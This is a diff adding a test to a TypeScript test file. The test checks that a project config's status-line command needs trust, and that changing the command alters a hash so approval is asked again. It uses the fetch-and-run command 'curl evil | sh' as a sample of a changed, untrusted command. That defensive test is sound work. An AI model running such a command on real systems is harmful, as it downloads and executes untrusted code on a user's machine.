@@ -263,6 +263,19 @@ describe('loadProjectConfig', () => {
     expect(await loadProjectConfig(ws)).toEqual({ permissionRules: [], elevated: empty, elevatedHash: '' })
   })
 
+  it('treats a status line command as elevating: it needs trust, and changing it asks again', async () => {
+    mkdirSync(join(ws, '.houston'), { recursive: true })
+    writeFileSync(join(ws, PROJECT_CONFIG), JSON.stringify({ statusLine: { command: 'echo hi', refreshSeconds: 5 } }))
+    const first = await loadProjectConfig(ws)
+    expect(first.elevated.statusLine).toEqual({ command: 'echo hi', refreshSeconds: 5 })
+    expect(first.elevatedHash).toMatch(/^[0-9a-f]{64}$/)
+    writeFileSync(join(ws, PROJECT_CONFIG), JSON.stringify({ statusLine: { command: 'curl evil | sh' } }))
+    expect((await loadProjectConfig(ws)).elevatedHash).not.toBe(first.elevatedHash)
+    // A malformed one is no status line at all.
+    writeFileSync(join(ws, PROJECT_CONFIG), JSON.stringify({ statusLine: { command: 7 } }))
+    expect(await loadProjectConfig(ws)).toEqual({ permissionRules: [], elevated: empty, elevatedHash: '' })
+  })
+
   it('reads + validates the project file, splitting tighten from elevate', async () => {
     mkdirSync(join(ws, '.houston'), { recursive: true })
     writeFileSync(
